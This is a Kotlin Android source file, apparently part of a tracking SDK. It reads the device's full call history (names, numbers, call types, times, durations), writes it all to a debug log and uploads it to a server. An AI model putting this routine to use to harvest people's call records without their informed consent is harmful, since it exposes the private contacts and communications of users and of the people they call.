package com.x.leo.apphelper.trace

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.pm.PackageManager
import android.provider.CallLog
import android.support.v4.content.ContextCompat
import android.text.TextUtils
import com.x.leo.apphelper.log.xlog.XLog
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject

/**
 * @作者:XLEO
 * @创建日期: 2017/9/6 16:48
 * @描述:${TODO}
 *
 * @更新者:${Author}$
 * @更新时间:${Date}$
 * @更新描述:${TODO}
 * @下一步：
 */
object CallLogTraceManager {
    private val UPDATETIME: String = "Call log update time"

    @SuppressLint("MissingPermission")
            /**
     * Get the Call Logs

     * @param mActivity
     * *
     * @return
     */
    fun getCallLogs(mActivity: Activity): JSONObject {

        val callLogsEntity = JSONObject()
        var totalNumber: Long = 0L
        var latestTime: Long? = java.lang.Long.MAX_VALUE
        var earliestTime: Long? = java.lang.Long.MIN_VALUE

        val callLogsArray = JSONArray()
        val contentResolver = mActivity.contentResolver

        /**
         * CallLog.Calls.TYPE
         * INCOMING_TYPE = 1
         * OUTGOING_TYPE = 2
         * MISSED_TYPE = 3
         * VOICEMAIL_TYPE = 4
         * REJECTED_TYPE = 5
         * BLOCKED_TYPE = 6
         * ANSWERED_EXTERNALLY_TYPE = 7
         */
        if (ContextCompat.checkSelfPermission(mActivity, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,
                    arrayOf(CallLog.Calls.CACHED_NAME,
                            CallLog.Calls.NUMBER,
                            CallLog.Calls.TYPE,
                            CallLog.Calls.DATE,
                            CallLog.Calls.DURATION
                            ), null, null, CallLog.Calls.DEFAULT_SORT_ORDER)

            while (cursor != null && cursor.moveToNext()) {
                val callLog = JSONObject()

                try {
                    totalNumber++
                    latestTime = Math.min(latestTime!!, java.lang.Long.parseLong(cursor.getString(3)))
                    earliestTime = Math.max(earliestTime!!, java.lang.Long.parseLong(cursor.getString(3)))
                    var string = cursor.getString(0)
                    val string1 = cursor.getString(1)
                    if (TextUtils.isEmpty(string) && !TextUtils.isEmpty(string1)) {
                        string = SmsTraceManager.getNameByAddress(mActivity, string1)
                    }
                    callLog.put("name", string)
                    callLog.put("number", string1)
                    when (cursor.getInt(2)) {
                        CallLog.Calls.INCOMING_TYPE -> {
                            callLog.put("direction","INCOMING_TYPE" )
                        }
                        CallLog.Calls.OUTGOING_TYPE -> {
                            callLog.put("direction","OUTGOING_TYPE" )

                        }
                        CallLog.Calls.MISSED_TYPE -> {
                            callLog.put("direction","MISSED_TYPE" )

                        }
                        CallLog.Calls.VOICEMAIL_TYPE -> {
                            callLog.put("direction","VOICEMAIL_TYPE" )

                        }

                        CallLog.Calls.REJECTED_TYPE -> {
                            callLog.put("direction","REJECTED_TYPE" )

                        }

                        CallLog.Calls.BLOCKED_TYPE -> {
                            callLog.put("direction","BLOCKED_TYPE" )

                        }
                        CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> {
                            callLog.put("direction","ANSWERED_EXTERNALLY_TYPE" )

                        }
                        else -> {
                            callLog.put("direction","UNKNOW_TYPE" )
                        }
                    }

                    callLog.put("createTime", cursor.getString(3))
                    callLog.put("duration", cursor.getString(4))
                    callLogsArray.put(callLog)
                } catch (ex: JSONException) {
                    XLog.d("JSONException: " + ex.message,10)
                    ex.printStackTrace()
                }

            }

            cursor?.close()

            try {
                val packageInfo = mActivity.packageManager.getPackageInfo(mActivity.packageName, 0)
                callLogsEntity.put("protocolName", ProtocolName.CALL_LOG)
                callLogsEntity.put("protocolVersion", ProtocolVersion.V_1_0)
                callLogsEntity.put("versionName", packageInfo.versionName)

                callLogsEntity.put("totalNumber", totalNumber)
                val currentTime = System.currentTimeMillis()
                callLogsEntity.put("latestTime", currentTime)
                callLogsEntity.put("earliestTime", LocalTimestamp.getTimestamp(mActivity.applicationContext,UPDATETIME))
                LocalTimestamp.addTimestamp(mActivity.applicationContext, UPDATETIME,currentTime)
                callLogsEntity.put("data", callLogsArray)
            } catch (ex: JSONException) {
                XLog.d("JSONException: " + ex.message,10)
                ex.printStackTrace()
            } catch (e: PackageManager.NameNotFoundException) {
                e.printStackTrace()
                XLog.d("PackageManager.NameNotFoundException: " + e.message,10)
            }


        } else {
            XLog.d("Call logs permission deny",10)
        }

        XLog.d(callLogsEntity.toString(),10)
        return callLogsEntity

    }

    fun obtainAndUpload(act: Activity) {
        TraceSender.sendInfo(act.applicationContext, getCallLogs(act))
    }

}